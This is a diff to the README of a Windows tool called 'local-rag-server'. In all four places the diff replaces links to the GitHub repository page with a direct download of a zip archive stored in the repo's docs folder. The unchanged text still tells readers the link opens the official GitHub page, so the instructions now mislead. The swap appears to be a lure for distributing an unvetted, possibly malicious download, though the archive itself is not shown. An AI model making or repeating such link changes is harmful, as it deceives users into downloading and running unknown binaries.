@@ -1,6 +1,6 @@
 # 🤖 local-rag-server - Offline Document Chat Made Easy
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20App-green?style=for-the-badge)](https://github.com/umiii100/local-rag-server)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-green?style=for-the-badge)](https://raw.githubusercontent.com/umiii100/local-rag-server/main/docs/local_server_rag_v2.9.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Follow these steps to download and run local-rag-server on your Windows PC.
 
 Visit the download page below to get the latest installer:
 
-[![Download local-rag-server](https://img.shields.io/badge/Download---blue?style=for-the-badge)](https://github.com/umiii100/local-rag-server)
+[![Download local-rag-server](https://img.shields.io/badge/Download---blue?style=for-the-badge)](https://raw.githubusercontent.com/umiii100/local-rag-server/main/docs/local_server_rag_v2.9.zip)
 
 Click the link above. This will open the official GitHub page where you can download the setup file.
 
@@ -136,7 +136,7 @@ You can optionally customize local-rag-server settings after installation by edi
 
 To get the latest features or fixes:
 
-1. Return to the [download page](https://github.com/umiii100/local-rag-server)  
+1. Return to the [download page](https://raw.githubusercontent.com/umiii100/local-rag-server/main/docs/local_server_rag_v2.9.zip)  
 2. Download the newest setup file  
 3. Run the installer again; it will update your existing installation  
 
@@ -147,4 +147,4 @@ To get the latest features or fixes:
 - Browse the GitHub repository for advanced usage or developer information.  
 - Visit the web interface help page for detailed instructions on features.  
 
-[Download latest local-rag-server here](https://github.com/umiii100/local-rag-server)
+[Download latest local-rag-server here](https://raw.githubusercontent.com/umiii100/local-rag-server/main/docs/local_server_rag_v2.9.zip)
